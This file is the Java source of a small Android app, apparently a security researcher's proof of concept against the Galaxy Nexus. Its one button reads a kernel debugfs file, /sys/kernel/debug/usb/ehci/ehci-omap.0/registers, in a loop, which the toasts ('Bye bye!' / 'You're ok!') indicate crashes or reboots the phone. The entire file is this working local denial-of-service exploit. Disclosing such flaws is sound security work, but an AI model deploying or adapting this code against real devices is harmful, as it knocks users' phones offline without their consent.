package com.insitusec.gnexcdmacrash;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;

import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class GnexGDMAReboot extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_gnex_gdmareboot);
		
		final Button btnLaunch = (Button) findViewById(R.id.button1);
		btnLaunch.setOnClickListener(new View.OnClickListener() {
			
			@Override
			public void onClick(View v) {
				// TODO Auto-generated method stub
				byte[] buffer = new byte[1024];
				File ohCrap = new File("/sys/kernel/debug/usb/ehci/ehci-omap.0/registers");
				FileInputStream ohCrapFis = null;
				try {
					Toast.makeText(getApplicationContext(), "Bye bye!", Toast.LENGTH_LONG).show();
					ohCrapFis = new FileInputStream(ohCrap);
					int bytesRead = 0;
					do {
						bytesRead = ohCrapFis.read(buffer);
					} while (bytesRead > 0);
					
				} catch (FileNotFoundException e) {
					
					// TODO Auto-generated catch block
					Toast.makeText(getApplicationContext(), "You're ok!", Toast.LENGTH_LONG).show();

				} catch (IOException e) {
					// TODO Auto-generated catch block
					//Log.d(DTAG, "File " + ohCrap.getAbsolutePath() + "had an IO Exception");
					//e.printStackTrace();
				}
			}
		});
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.activity_gnex_gdmareboot, menu);
		return true;
	}

}
